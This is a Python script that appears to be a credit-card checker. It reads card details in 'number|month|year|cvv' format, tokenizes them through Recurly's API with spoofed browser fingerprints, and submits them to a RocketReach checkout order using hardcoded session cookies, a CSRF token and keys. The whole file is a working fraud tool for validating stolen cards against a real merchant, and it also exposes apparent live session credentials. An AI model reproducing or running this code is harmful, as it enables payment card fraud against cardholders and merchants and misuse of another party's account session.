import requests

ss = requests.Session()






user_input = input('Enter Card Visa : ')
ccn, mm, yy, cvc = user_input.split('|')

data = {
    'first_name': 'Stewin',
    'last_name': 'William',
    'token': '',
    'country': 'US',
    'postal_code': '94903',
    'address1': '71 San Pablo Ave',
    'city': 'San Rafael',
    'state': 'CA',
    'company': '',
    'number': ccn,
    
        'color_depth': 24,
        'java_enabled': False,
        'language': 'en-US',
        'referrer_url': 'https://rocketreach.co/billing/checkout',
        'screen_height': 1077,
        'screen_width': 1482,
        'time_zone_offset': -330,
        'user_agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    
    'month': mm,
    'year': yy,
    'cvv': cvc,
    'version': '4.30.0',
    'key': 'ewr1-fNG13rMACSB36KccccmfQF',
    'deviceId': 'BFahv2LO4L02pB6z',
    'sessionId': '3ZMKVCiFlFTHNmvm',
    'instanceId': 'h3R7cyDud2uy8azQ'
}
headers = {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Content-Length': '760',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://api.recurly.com',
    'Pragma': 'no-cache',
    'Priority': 'u=1, i',
    'Referer': 'https://api.recurly.com/js/v1/field.html',
    'Sec-CH-UA': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'Sec-CH-UA-Mobile': '?1',
    'Sec-CH-UA-Platform': '"Android"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
}
res = ss.post('https://api.recurly.com/js/v1/token',data=data,headers=headers)
print(res.text)
json_text = res.json()
id = json_text['id']
print(id)


first_six = ccn[:6]

# extract last four digits
last_four = ccn[-4:]

data = {
    'token': {
        'type': 'credit_card',
        'id': id
    },
    'type': 'credit_card',
    'redactedBillingInfo': {
        'street': '71 San Pablo Ave',
        'city': 'San Rafael',
        'state': 'CA',
        'country': 'US',
        'postalCode': '94903',
        'firstSix': first_six,
        'lastFour': last_four
    }
}

 
headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Content-Length': '242',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://rocketreach.co',
    'Pragma': 'no-cache',
    'Priority': 'u=1, i',
    'Referer': 'https://rocketreach.co/billing/checkout',
    'Sec-CH-UA': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'Sec-CH-UA-Mobile': '?1',
    'Sec-CH-UA-Platform': '"Android"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'X-CSRFToken': 'MUIgHwIOvoMdoDbQbUmFNpV6roAizKzh0X74goDd2EhjgLaQFpJ11jtIBLjnTNsd',
    'X-RR-For': 'b76be493d1069a55995d27c93e802cc1',
    'X-Source-Page': '/billing/checkout',
    'Cookie':'cj2=L3BlcnNvbg; _ga=GA1.1.1356443306.1727373151; __hstc=94151554.743829493485678600e8946b9be30eb7.1727373160085.1727373160085.1727373160085.1; hubspotutk=743829493485678600e8946b9be30eb7; __hssrc=1; _clck=g2iew2%7C2%7Cfpi%7C0%7C1730; validation_token=odzYJ25zHqFg2i9aEFxwo4IMkxTfud36; sessionid-20191028=06j2man98nics9aulrsgqs57tqakeuh3; sessionid-20191028=06j2man98nics9aulrsgqs57tqakeuh3; __ssid=eeecdbfb1788aac309ff4d6166ba7cd; __stripe_mid=039f2214-0e01-4862-87d1-7f64f6bb073d3f2069; __stripe_sid=385f3095-68d8-4103-ba00-2097836eb1a7fcad1a; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Sep+26+2024+23%3A30%3A42+GMT%2B0530+(India+Standard+Time)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d07bb5bb-742b-4b61-9853-3bb90f43c644&interactionCount=1&isAnonUser=1&landingPath=NotLandingPage&groups=C0002%3A1%2CC0001%3A1%2CC0003%3A1%2CC0004%3A1&AwaitingReconsent=false; _uetsid=201615107c3011ef8a4b83b54386956a|c7xjqq|2|fpi|0|1730; _uetvid=20163bf07c3011ef9c21558b9c06ea15|1rroksf|1727373261945|1|1|bat.bing.com/p/insights/c/k; __hssc=94151554.8.1727373160085; _clsk=5hzu1r%7C1727373656060%7C8%7C0%7Ck.clarity.ms%2Fcollect; _gcl_au=1.1.1065843615.1727373150.846369513.1727373173.1727373723; _ga_FB8KKHJC7E=GS1.1.1727373151.1.1.1727373877.11.0.0'
}
res = ss.post('https://rocketreach.co/billing/orders/785387/checkout/',json=data,headers=headers)

print(res.text)